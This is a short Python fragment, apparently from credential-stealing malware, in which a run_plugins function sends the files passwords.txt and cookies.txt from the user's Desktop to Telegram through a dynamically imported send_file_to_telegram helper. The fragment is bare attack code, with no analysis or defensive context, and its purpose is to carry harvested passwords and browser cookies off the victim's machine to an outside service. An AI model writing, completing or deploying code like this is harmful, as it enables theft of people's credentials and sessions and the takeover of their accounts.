...
def run_plugins():
    ...
    dynamic_import(__name__, 'send_file_to_telegram')(os.path.join(os.environ["USERPROFILE"], "Desktop", "passwords.txt"),'Password File')
    dynamic_import(__name__, 'send_file_to_telegram')(os.path.join(os.environ["USERPROFILE"], "Desktop", "cookies.txt"), 'Cookies File')
